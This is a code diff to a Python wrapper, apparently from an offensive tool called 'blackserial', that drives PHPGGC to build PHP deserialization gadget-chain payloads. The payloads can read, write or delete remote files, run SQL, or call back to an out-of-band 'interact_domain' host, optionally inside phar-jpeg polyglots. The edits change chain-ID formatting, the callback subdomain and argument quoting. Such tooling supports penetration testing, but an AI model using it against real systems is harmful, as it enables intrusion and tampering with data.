@@ -120,7 +120,7 @@ class PHPGGC(Serializer):
                     continue
                 
                 if len(chain['formats']) > 1:
-                    chainUniqueId = f"{chain['id']}_{chain['formats'].index(format)}"
+                    chainUniqueId = f"{chain['id']}-{chain['formats'].index(format)}"
                 else:
                     chainUniqueId = chain['id']
 
@@ -144,7 +144,7 @@ class PHPGGC(Serializer):
                 chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
                 chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'php'))
                 chainArguments = chainArguments.replace('<remote_file_to_delete>', remote_file_to_delete)
-                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.php")
+                chainArguments = chainArguments.replace('<url>', f"https://{chain['id']}.{interact_domain}/{chain['id']}.php")
                 chainArguments = chainArguments.replace('<sql>', sql.replace("'", "\\'"))
 
                 with open(fp.name, mode='w') as ft:
@@ -153,10 +153,10 @@ class PHPGGC(Serializer):
                 if self.chainOpts.phar == 'jpg':
                     jpgPath = os.path.join(self.chainOpts.output, chainUniqueId +".jpg")
                     templateJpgPath =  os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '../blackserial.jpg'))
-                    chainArguments = f"{chainArguments} --phar tar --phar-jpeg {templateJpgPath} -o '{jpgPath}'"
+                    chainArguments = f"{chainArguments} --phar tar --phar-jpeg '{templateJpgPath}' -o '{jpgPath}'"
                 elif self.chainOpts.phar:
                     pharPath = os.path.join(self.chainOpts.output, chainUniqueId +".phar")
-                    chainArguments = f"{chainArguments} --phar {self.chainOpts.phar} -o '{pharPath}'"
+                    chainArguments = f"{chainArguments} --phar '{self.chainOpts.phar}' -o '{pharPath}'"
                 
                 result = self.payload(chain['name'], chainArguments)
                 if result.returncode != 0:
